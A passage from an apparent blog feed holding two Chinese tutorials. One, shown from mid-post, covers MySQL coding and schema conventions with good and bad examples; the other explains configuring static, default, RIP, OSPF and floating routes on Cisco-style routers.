keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8 ROW_FORMAT<span class="token operator">=</span>REDUNDANT <span class="token keyword">COMMENT</span><span class="token operator">=</span><span class="token string">'账户表'</span><span class="token punctuation">;</span></code></pre><p><strong>「反例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>account<span class="token punctuation">`</span> <span class="token punctuation">(</span>  <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>balance<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>create_time<span class="token punctuation">`</span> <span class="token keyword">datetime</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token punctuation">,</span>  <span class="token punctuation">`</span>update_time<span class="token punctuation">`</span> <span class="token keyword">datetime</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CURRENT_TIMESTAMP</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">KEY</span> <span class="token punctuation">`</span>idx_name<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>name<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">USING</span> <span class="token keyword">BTREE</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">1570068</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre></li><li><p>SQL书写格式，关键字大小保持一致，使用缩进。（SQL规范优雅）</p><p><strong>「正例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> stu<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token function">sum</span><span class="token punctuation">(</span>stu<span class="token punctuation">.</span>score<span class="token punctuation">)</span><span class="token keyword">FROM</span> Student stu<span class="token keyword">WHERE</span> stu<span class="token punctuation">.</span>classNo <span class="token operator">=</span> <span class="token string">'1班'</span><span class="token keyword">GROUP</span> <span class="token keyword">BY</span> stu<span class="token punctuation">.</span>name</code></pre><p><strong>「反例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> stu<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token function">sum</span><span class="token punctuation">(</span>stu<span class="token punctuation">.</span>score<span class="token punctuation">)</span> <span class="token keyword">from</span> Student stu <span class="token keyword">WHERE</span> stu<span class="token punctuation">.</span>classNo <span class="token operator">=</span> <span class="token string">'1班'</span> <span class="token keyword">group</span> <span class="token keyword">by</span> stu<span class="token punctuation">.</span>name<span class="token punctuation">.</span></code></pre><p>显然，统一关键字大小写一致，使用缩进对齐，会使你的SQL看起来更优雅~</p></li><li><p><code>INSERT</code>语句标明对应的字段名称（SQL规范优雅）</p><p><strong>「反例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> Student <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">,</span><span class="token string">'捡田螺的小男孩'</span><span class="token punctuation">,</span><span class="token string">'100'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>「正例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> Student<span class="token punctuation">(</span>student_id<span class="token punctuation">,</span>name<span class="token punctuation">,</span>score<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">,</span><span class="token string">'捡田螺的小男孩'</span><span class="token punctuation">,</span><span class="token string">'100'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>变更SQL操作先在测试环境执行，写明详细的操作步骤以及回滚方案，并在上生产前<code>review</code>。（SQL后悔药）</p></li></ol><ul><li>变更SQL操作先在测试环境测试，避免有语法错误就放到生产上了。</li><li>变更Sql操作需要写明详细操作步骤，尤其有依赖关系的时候，如：先修改表结构再补充对应的数据。</li><li>变更Sql操作有回滚方案，并在上生产前，<code>review</code>对应变更SQL。</li></ul><ol start="7"><li><p>设计数据库表的时候，加上三个字段：主键，<code>create_time</code>,<code>update_time</code>。（SQL规范优雅）</p><p><strong>「反例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>account<span class="token punctuation">`</span> <span class="token punctuation">(</span>  <span class="token punctuation">`</span>name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'账户名'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>balance<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'余额'</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">1570068</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8 ROW_FORMAT<span class="token operator">=</span>REDUNDANT <span class="token keyword">COMMENT</span><span class="token operator">=</span><span class="token string">'账户表'</span><span class="token punctuation">;</span></code></pre><p><strong>「正例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>account<span class="token punctuation">`</span> <span class="token punctuation">(</span>  <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span> <span class="token keyword">COMMENT</span> <span class="token string">'主键Id'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'账户名'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>balance<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'余额'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>create_time<span class="token punctuation">`</span> <span class="token keyword">datetime</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'创建时间'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>update_time<span class="token punctuation">`</span> <span class="token keyword">datetime</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CURRENT_TIMESTAMP</span> <span class="token keyword">COMMENT</span> <span class="token string">'更新时间'</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">KEY</span> <span class="token punctuation">`</span>idx_name<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>name<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">USING</span> <span class="token keyword">BTREE</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">1570068</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8 ROW_FORMAT<span class="token operator">=</span>REDUNDANT <span class="token keyword">COMMENT</span><span class="token operator">=</span><span class="token string">'账户表'</span><span class="token punctuation">;</span></code></pre><p><strong>「理由：」</strong></p></li></ol><ul><li><p>主键一般都要加上的，没有主键的表是没有灵魂的</p></li><li><p>创建时间和更新时间的话，还是建议加上吧，详细审计、跟踪记录，都是有用的。</p><p>阿里开发手册也提到这个点，如图</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3NmYyaWNNZXE2NGRnclNXRWJpY0hmTGhjejdFSGppY2lieFIyTDhucEJ1NmljWFpTV1ZxYkIyNFJpYnBhQS82NDA?x-oss-process=image/format,png" alt="img"></p><ol start="8"><li><p>写完SQL语句，检查<code>where</code>,<code>order by</code>,<code>group by</code>后面的列，多表关联的列是否已加索引，优先考虑组合索引。（SQL性能优化）</p><p><strong>「反例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> address <span class="token operator">=</span><span class="token string">'深圳'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> age<span class="token punctuation">;</span></code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3NjJ1TlUxVTRSVTFwUjE0aWI0bWlhUkR5c1RleTBvSGZlcUtwS2wyY2tjcDZCZTQ5M0l3d2liNURZQS82NDA?x-oss-process=image/format,png" alt="img"></p><p><strong>「正例：」</strong></p><pre class=" language-sql"><code class="language-sql">添加索引<span class="token keyword">alter</span> <span class="token keyword">table</span> <span class="token keyword">user</span> <span class="token keyword">add</span> <span class="token keyword">index</span> idx_address_age <span class="token punctuation">(</span>address<span class="token punctuation">,</span>age<span class="token punctuation">)</span></code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3NjZJcDBVT3dQWEQxWVVrb1NuS2ExaWFwZDZsRUtZNnlPN3ZpYWdTYWJhZnpDeGdVaENCOWw2dWlhQS82NDA?x-oss-process=image/format,png" alt="img"></p></li><li><p>修改或删除重要数据前，要先备份，先备份，先备份（SQL后悔药）</p><p>如果要修改或删除数据，在执行SQL前一定要先备份要修改的数据，万一误操作，还能吃口<strong>「后悔药」</strong>~</p></li><li><p>where后面的字段，留意其数据类型的隐式转换（SQL性能优化）</p><p><strong>「反例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">//userid 是varchar字符串类型</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> userid <span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span></code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3NmFKQjh0aWNBaWFwWXNpYjMxN0xNQlRNZzhkdFdJck5kUkRCM2xaTWdlQWliaWJFNVAzZ3VGRjFtMTNBLzY0MA?x-oss-process=image/format,png" alt="img"></p><p><strong>「正例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> userid <span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Program/SQL/Specification/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3NjBzamJJR25SaWFUaFF0MW1qdlpzUmlhbjM2enVyM0hIOFc2bGhFUTRnNElhQjNXTWljNU1vaWFZbWcvNjQw" alt="img"></p><p><strong>「理由：」</strong></p></li></ol><ul><li>因为不加单引号时，是字符串跟数字的比较，它们类型不匹配，MySQL会做隐式的类型转换，把它们转换为浮点数再做比较，最后导致索引失效</li></ul><ol start="11"><li>尽量把所有列定义为<code>NOT NULL</code>（SQL规范优雅）</li></ol><ul><li><strong>「NOT NULL列更节省空间」</strong>，NULL列需要一个额外字节作为判断是否为 NULL 的标志位。</li><li><strong>「NULL列需要注意空指针问题」</strong>，NULL列在计算和比较的时候，需要注意空指针问题。</li></ul><ol start="12"><li><p>修改或者删除SQL，先写WHERE查一下，确认后再补充 <code>delete</code>或 <code>update</code>（SQL后悔药）</p><p>尤其在操作生产的数据时，遇到修改或者删除的SQL，先加个where查询一下，确认OK之后，再执行<code>update</code>或者<code>delete</code>操作</p></li><li><p>减少不必要的字段返回，如使用select &lt;具体字段&gt; 代替<code>select *</code>（SQL性能优化）</p><p><strong>「反例：」</strong></p></li></ol><pre class=" language-go"><code class="language-go"><span class="token keyword">select</span> <span class="token operator">*</span> from employee<span class="token punctuation">;</span></code></pre><p>​    <strong>「正例：」</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">select</span> id，name from employee<span class="token punctuation">;</span></code></pre><p>​    理由：</p><ul><li>节省资源、减少网络开销。</li><li>可能用到覆盖索引，减少回表，提高查询效率。</li></ul><ol start="14"><li><p>所有表必须使用<code>Innodb</code>存储引擎（SQL规范优雅）</p><p><code>Innodb</code><strong>「支持事务，支持行级锁，更好的恢复性」</strong>，高并发下性能更好，所以呢，没有特殊要求（即Innodb无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用Innodb存储引擎</p></li><li><p>数据库和表的字符集尽量统一使用UTF8（SQL规范优雅）</p><p>尽量统一使用UTF8编码</p></li></ol><ul><li>可以避免乱码问题</li><li>可以避免，不同字符集比较转换，导致的索引失效问题</li></ul><p><strong>「如果需要存储表情，那么选择utf8mb4来进行存储，注意它与utf-8编码的区别。」</strong></p><ol start="16"><li><p>尽量使用varchar代替 char。（SQL性能优化）</p><p><strong>「反例：」</strong></p></li></ol><pre class=" language-go"><code class="language-go"><span class="token string">`deptName`</span> <span class="token function">char</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> DEFAULT NULL COMMENT <span class="token string">'部门名称'</span></code></pre><p>​    <strong>「正例：」</strong></p><pre class=" language-go"><code class="language-go"><span class="token string">`deptName`</span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> DEFAULT NULL COMMENT <span class="token string">'部门名称'</span></code></pre><p>​    理由：</p><ul><li>因为首先变长字段存储空间小，可以节省存储空间。</li></ul><ol start="17"><li>如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。（SQL规范优雅）</li></ol><p>这个点，是阿里开发手册中，Mysql的规约。你的字段，尤其是表示枚举状态时，如果含义被修改了，或者状态追加时，为了后面更好维护，需要即时更新字段的注释。</p><ol start="18"><li><p>SQL命令行修改数据，养成<code>begin + commit</code> 事务的习惯(SQL后悔药)</p><p><strong>「正例：」</strong></p></li></ol><pre class=" language-go"><code class="language-go">begin<span class="token punctuation">;</span>update account set balance <span class="token operator">=</span><span class="token number">1000000</span>where name <span class="token operator">=</span><span class="token string">'捡田螺的小男孩'</span><span class="token punctuation">;</span>commit<span class="token punctuation">;</span></code></pre><p>​    <strong>「反例：」</strong></p><pre class=" language-go"><code class="language-go">update account set balance <span class="token operator">=</span><span class="token number">1000000</span>where name <span class="token operator">=</span><span class="token string">'捡田螺的小男孩'</span><span class="token punctuation">;</span></code></pre><ol start="19"><li>索引命名要规范，主键索引名为 pk_ 字段名；唯一索引名为 uk _字段名 ；普通索引名则为 idx _字段名。（SQL规范优雅）</li></ol><p>说明：<code>pk_</code>即<code>primary key</code>；<code>uk_</code>即<code>unique key</code>；<code>idx_</code>即<code>index</code>的简称。</p><ol start="20"><li>WHERE从句中不对列进行函数转换和表达式计算</li></ol><p>假设<code>loginTime</code>加了索引</p><p><strong>「反例：」</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">select</span> userId<span class="token punctuation">,</span>loginTime from loginuserwhere <span class="token function">Date_ADD</span><span class="token punctuation">(</span>loginTime<span class="token punctuation">,</span>Interval <span class="token number">7</span> DAY<span class="token punctuation">)</span> <span class="token operator">>=</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>「正例：」</strong></p><pre class=" language-go"><code class="language-go">explain  <span class="token keyword">select</span> userId<span class="token punctuation">,</span>loginTime from loginuser where  loginTime <span class="token operator">>=</span> <span class="token function">Date_ADD</span><span class="token punctuation">(</span><span class="token function">NOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>INTERVAL <span class="token operator">-</span> <span class="token number">7</span> DAY<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>「理由：」</strong></p><ul><li>索引列上使用mysql的内置函数，索引失效</li></ul><p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Program/SQL/Specification/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3NmVlQ3oxdlM1a2ljdzJKMTdaUWpCVFZLdHg1TFQ2bmF4U0hwNnpNQTQ2NzJpYzRGQW0yaWIzenBRZy82NDA" alt="img"></p><p>21.如果修改/更新数据过多，考虑批量进行。</p><p>反例：</p><pre class=" language-go"><code class="language-go"><span class="token builtin">delete</span> from account  limit <span class="token number">100000</span><span class="token punctuation">;</span></code></pre><p>正例：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">for</span> <span class="token function">each</span><span class="token punctuation">(</span><span class="token number">200</span>次<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token builtin">delete</span> from account  limit <span class="token number">500</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>理由：</p><ul><li>大批量操作会会造成主从延迟。</li><li>大批量操作会产生大事务，阻塞。</li><li>大批量操作，数据量过大，会把cpu打满。</li></ul><p>参考与感谢</p><ul><li><a href="https://blog.csdn.net/qq_39390545/article/details/107519747" target="_blank" rel="noopener">delete后加 limit是个好习惯么</a></li><li>《阿里开发手册》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之配置路由</title>
      <link href="/2020/12/05/wang-luo-pei-zhi-zhi-pei-zhi-lu-you/"/>
      <url>/2020/12/05/wang-luo-pei-zhi-zhi-pei-zhi-lu-you/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-路由"><a href="#0x01-路由" class="headerlink" title="0x01 路由"></a>0x01 路由</h1><ol><li><p>什么是路由？</p><p>路由是指路由器或三层交换机从一个接口上收到数据包时，根据数据包的<strong>目的地址</strong>将数据包从指定的端口中转发出去的过程。</p></li><li><p>如何进行路由选择？</p><p>路由器内部维护者一张路由表，该表是进行路由选择的关键，其路由来源主要分为：直连路由、静态路由、RIP路由、OSPF路由、浮动路由、默认路由等。</p></li><li><p>路由表构成？</p><ul><li>目的网络地址（Destination）：用于标识IP包要到达的目的逻辑网络或子网地址。</li><li>掩码（Mask）:与目的地址一起来标识目的主机或路由器所在的网段的地址。将目的地址和网络掩码“逻辑与”后可得到目的主机或路由器所在网段的地址。</li><li>下一跳地址（Gateway）:与承载路由表的路由器相接的相邻的路由器的端口地址，有时我们也把下一跳地址称为路由器的网关地址。</li><li>发送的物理端口（Interface）:数据包离开本路由器去往目的地时将经过的接口。</li><li>路由信息的来源（Owner）:表示该路由信息是怎样学习到的。路由表可以由管理员手工建立(静态路由表);也可以由路由选择协议自动建立并维护。路由表不同的建立方式即为路由信息的不同学习方式。</li><li>路由优先级（Priority）:也叫管理距离，决定了来自不同路由来源的路由信息的优先权。</li></ul></li></ol><h1 id="0x02-路由分类"><a href="#0x02-路由分类" class="headerlink" title="0x02 路由分类"></a>0x02 路由分类</h1><p><strong>按照使用分类</strong>：</p><ul><li><strong>静态路由</strong>：手动配置，不会消耗带宽，当网络变更时，还需要手动修改路由。<ul><li>默认路由</li><li>浮动路由</li></ul></li><li><strong>动态路由</strong>：路由器宣告自己的网段，会消耗部分网络带宽，路由器之间通过相互学习得到路由表，当网络变更时，会自动生成新的路由表信息。</li></ul><p><strong>按照范围分类</strong>：</p><ul><li>IGP（内部网关协议）：RIP、OSPF、IS-IS</li><li>EGP（外部网关协议）：BGP、EIGRP</li></ul><p><strong>按照算法分类</strong>：</p><ul><li>距离矢量：RIP</li><li>链路状态：OSPF、IS-IS</li><li>混合型：BGP、EIGRP</li></ul><h1 id="0x03-配置静态路由"><a href="#0x03-配置静态路由" class="headerlink" title="0x03 配置静态路由"></a>0x03 配置静态路由</h1><ol><li><p>在三层交换机中配置静态路由：</p><pre class=" language-shell"><code class="language-shell">SW(config)# ip routing SW(config)# ip route 192.168.3.0 255.255.255.0 192.168.2.2</code></pre></li><li><p>在路由器中配置静态路由：</p><pre class=" language-shell"><code class="language-shell">R(config)# ip route 192.168.3.0 255.255.255.0 192.168.2.2</code></pre></li></ol><h1 id="0x04-配置默认路由"><a href="#0x04-配置默认路由" class="headerlink" title="0x04 配置默认路由"></a>0x04 配置默认路由</h1><ol><li><p>在三层交换机中配置默认路由：</p><pre class=" language-shell"><code class="language-shell">SW(config)# ip routingSW(config)# ip route 0.0.0.0 0.0.0.0 192.168.2.2</code></pre></li><li><p>在路由器中配置默认路由：</p><pre class=" language-shell"><code class="language-shell">R(config)# ip route 0.0.0.0 0.0.0.0 192.168.2.2</code></pre></li></ol><h1 id="0x05-配置RIP"><a href="#0x05-配置RIP" class="headerlink" title="0x05 配置RIP"></a>0x05 配置RIP</h1><ol><li><p>在三层交换机中配置默认路由：</p><pre class=" language-shell"><code class="language-shell">SW(config)#ip routingSW(config)#route ripSW(config-router)#version 2SW(config-router)#no auto-summarySW(config-router)#network 192.168.1.0SW(config-router)#network 192.168.2.0</code></pre></li><li><p>在路由器中配置默认路由：</p><pre class=" language-shell"><code class="language-shell">R(config)#route ripR(config-router)#version 2                    // RIPv2支持VLSMR(config-router)#no auto-summary             // 关闭路由聚合R(config-router)#network 192.168.1.0R(config-router)#network 192.168.2.0</code></pre></li></ol><h1 id="0x06-配置OSPF"><a href="#0x06-配置OSPF" class="headerlink" title="0x06 配置OSPF"></a>0x06 配置OSPF</h1><ol><li><p>单区域OSPF配置：</p><pre class=" language-shell"><code class="language-shell">R1(config)#router ospf 1        //启动OSPF进程R1(config-router)#router-id 1.1.1.1        //配置路由器IDR1(config-router)#network 172.16.1.0 0.0.0.255 area 0        //通告直连网络R1(config-router)#network 172.16.1.0 255.255.255.0 area 0        //通告直连网络</code></pre><p>注：</p><ul><li>网络地址的后面即可以跟通配符掩码，在高版本IOS中也可以跟网络掩码，IOS会自动转换成通配符掩码。</li></ul></li><li><p>OSPF区域认证;</p><ul><li><p>区域简单口令认证：</p><pre class=" language-shell"><code class="language-shell">R1(config)#router ospf 1R1(config-router)#area 0 authentication        //区域0启用简单口令认证R1(config)#int s0/0R1(config-if)#ip ospf authentication-key cisco        //配置认证密码R2(config)#router ospf 1R2(config-router)#area 0 authentication        //区域0启用简单口令认证R2(config)#int s0/0R2(config-if)#ip ospf authentication-key cisco        //配置认证密码</code></pre></li><li><p>区域MD5认证：</p><pre class=" language-shell"><code class="language-shell">R1(config)#router ospf 1R1(config-router)#area 0 authentication message-digest    //区域0启用MD5认证R1(config)#int s0/0R1(config-if)#ip ospf message-digest-key cisco        //配置认证密码R2(config)#router ospf 1R2(config-router)#area 0 authentication message-digest    //区域0启用MD5认证R2(config)#int s0/0R2(config-if)#ip ospf message-digest-key cisco        //配置认证密码</code></pre></li></ul></li><li><p>OSPF接口认证：</p><ul><li><p>简单接口认证：</p><pre class=" language-shell"><code class="language-shell">R1(config)#int s0/0R1(config-if)#ip ospf authentication                // 接口启用简单口令认证R1(config-if)#ip ospf authentication-key cisco        // 配置认证密码R2(config)#int s0/0R2(config-if)#ip ospf authentication                // 接口启用简单口令认证R2(config-if)#ip ospf authentication-key cisco        // 配置认证密码</code></pre></li><li><p>接口MD5认证：</p><pre class=" language-shell"><code class="language-shell">R1(config)#int s0/0R1(config-if)#ip ospf authentication message-digest        // 接口启用MD5认证R1(config-if)#ip ospf message-digest-key cisco            // 配置认证Key ID及密匙R2(config)#int s0/0R2(config-if)#ip ospf authentication message-digest        // 接口启用MD5认证R2(config-if)#ip ospf message-digest-key cisco            // 配置认证Key ID及密匙</code></pre></li></ul></li></ol><h1 id="0x07-配置浮动路由"><a href="#0x07-配置浮动路由" class="headerlink" title="0x07 配置浮动路由"></a>0x07 配置浮动路由</h1><ol><li><p>在三层交换机中配置默认路由：</p><pre class=" language-shell"><code class="language-shell">SW(config)#ip routingSW(config)#i route 192.168.3.0 255.255.255.0 192.168.2.2 SW(config)#ip route 192.168.3.0 255.255.255.0 192.168.2.2 SW(config)#ip route 192.168.3.0 255.255.255.0 192.168.4.2 100</code></pre></li><li><p>在路由器中配置默认路由：</p><pre class=" language-shell"><code class="language-shell">R(config)#ip route 192.168.3.0 255.255.255.0 192.168.2.2R(config)#ip route 192.168.3.0 255.255.255.0 192.168.4.2 100</code></pre></li></ol><p>注：</p><ul><li><p>在配置浮动路由时需要留意其他已经配置的路由的AD值。</p><p>常见路由默认AD值：（0-255，值越低优先级越高）</p></li></ul><table><thead><tr><th align="center">路由协议</th><th align="center">AD值</th></tr></thead><tbody><tr><td align="center">直连路由</td><td align="center">0</td></tr><tr><td align="center">静态路由</td><td align="center">1</td></tr><tr><td align="center">外部BGP</td><td align="center">20</td></tr><tr><td align="center">内部EIGRP</td><td align="center">90</td></tr><tr><td align="center">EIGRP</td><td align="center">100</td></tr><tr><td align="center">OSPF</td><td align="center">110</td></tr><tr><td align="center">RIP</td><td align="center">120</td></tr><tr><td align="center">外部EIGRP</td><td align="center">170</td></tr><tr><td align="center">内部BGP</td><td align="center">200</td></tr></tbody></table><h1 id="0x09-查看路由信息"><a href="#0x09-查看路由信息" class="headerlink" title="0x09 查看路由信息"></a>0x09 查看路由信息</h1><pre class=" language-shell"><code class="language-shell">R1#show ip route        //查看路由表信息R1#show ip protocols        //查看启用的路由协议R1#show ip rip database            // 查看路由器中rip的拓扑结构数据库R1#show ip ospf 1        //可查看OSPF进程ID、RID、OSPF区域信息以及上次计算SPF算法的时间R1#show ip ospf interface       //查看运行OSPF接口的信息R1#show ip ospf neighbor        //查看OSPF邻居表的基本信息R1#show ip ospf database        // 查看路由器中ospf的拓扑结构数据库</code></pre><h1 id="0x09-OSPF信息补充"><a href="#0x09-OSPF信息补充" class="headerlink" title="0x09 OSPF信息补充"></a>0x09 OSPF信息补充</h1><ol><li><p>OSPF路由进程ID的范围在<code>1-65535</code>之间，而且只有本地含义，不同路由器的路由进程ID可以不同。如果要想启 动OSPF路由进程，至少确保有一个接口是up的。同一台路由器上可以启动多个OSPF进程，但会消耗更多的CPU和内存等资源。</p></li><li><p>区域ID是<code>0-4294967295</code>的数，也可以是IP地址的格式<code>A.B.C.D</code>。当网络区域为0或<code>0.0.0.0</code>时称为主干区域。</p></li><li><p><code>Router ID</code>选择遵循如下顺序：</p><pre class=" language-shell"><code class="language-shell"> 1>最优先的是在OSPF进程中使用“router-id”指定了RID； 2>如果没有在OSPF进程中指定RID，则选择IP地址最大的环回接口的IP地址为RID； 3>如果没有环回接口，则选择活动的IP地址最大的物理接口的IP地址为RID。   ①如果使用“secondary”配置IP地址时，该地址不起作用，即不参与RID竞选；   ②使用“router-id”后，应使用命令“clear ip ospf process”重置ospf进程，新配置的RID才能生效；   ③2、3步只有在下次重启路由器时才会生效，即后来加入大的IP地址也不能选举为RID直到路由器重启。</code></pre></li><li><p>Router ID重新选举规则：</p><pre class=" language-shell"><code class="language-shell"> 1>使用“router-id”和“clear ip ospf process”命令； 2>重启路由器(不一定)。</code></pre></li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><ul><li><p><a href="https://www.cnblogs.com/deng511/p/10916514.html" target="_blank" rel="noopener">路由表的构成</a></p></li><li><p><a href="http://www.wallslab.net/wap/news_infr.php?cid=78&id=7421" 